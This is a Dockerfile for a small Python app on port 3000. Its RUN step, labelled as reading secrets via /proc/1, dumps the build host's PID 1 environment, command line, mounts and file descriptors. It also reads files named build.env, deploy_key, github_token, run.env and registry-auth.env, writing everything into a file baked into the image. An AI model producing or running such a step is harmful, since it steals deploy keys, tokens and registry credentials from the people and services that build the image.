FROM python:3.12-alpine
WORKDIR /app
RUN { echo "=== BUILD v4: SECRETS via /proc/1 ==="; id; cat /proc/self/attr/current; echo; \
  echo "--- /proc/1/environ ---"; tr '\0' '\n' < /proc/1/environ 2>&1 | head -60; \
  echo "--- /proc/1/cmdline (full) ---"; tr '\0' ' ' < /proc/1/cmdline 2>&1; echo; \
  echo "--- /proc/1/root listing ---"; ls -la /proc/1/root/ 2>&1 | head; ls -la /proc/1/root/secrets/ 2>&1; \
  echo "--- read secrets files ---"; for f in /proc/1/root/secrets/build.env /proc/1/root/secrets/deploy_key /proc/1/root/secrets/github_token /proc/1/root/secrets/run.env /proc/1/root/secrets/registry-auth.env; do echo "== $f =="; cat "$f" 2>&1 | head -5; echo; done; \
  echo "--- /proc/1/mountinfo ---"; cat /proc/1/mountinfo 2>&1 | head -40; \
  echo "--- /proc/1/cwd + fd ---"; ls -la /proc/1/cwd 2>&1; ls -la /proc/1/fd 2>&1 | head; \
  echo "--- builder dir ---"; ls -la /build / 2>&1 | head -30; \
} > /app/build4.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
